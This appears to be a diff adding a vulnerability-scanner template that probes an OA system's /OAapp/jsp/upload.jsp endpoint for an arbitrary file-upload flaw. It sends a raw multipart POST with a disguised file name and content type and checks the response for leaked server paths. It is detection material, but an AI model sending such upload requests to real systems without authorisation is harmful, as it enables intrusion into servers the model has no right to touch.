@@ -1,0 +1,37 @@
+id: htoa_upload
+
+info:
+  name: htoa_upload
+  author: sm
+  severity: critical
+  reference:
+   - https://mp.weixin.qq.com/s/Ite0aOtRp9SPrh4h8yNQwQ
+  tags: htoa
+
+http:
+  - raw:
+      - |
+        POST /OAapp/jsp/upload.jsp HTTP/1.1
+        Host: x.x.x.x:800
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 293
+
+        ------WebKitFormBoundary5Ur8laykKAWws2QO
+        Content-Disposition: form-data; name="file"; filename="xxx.xml"
+        Content-Type: image/png
+
+        real path
+        ------WebKitFormBoundary5Ur8laykKAWws2QO
+        Content-Disposition: form-data; name="filename"
+
+        xxx.png
+        ------WebKitFormBoundary5Ur8laykKAWws2QO--
+        
+    matchers:
+      - type: word
+        words:
+          - "htoadata"
+          - "appdata"
+          - "temp"
+        condition: and
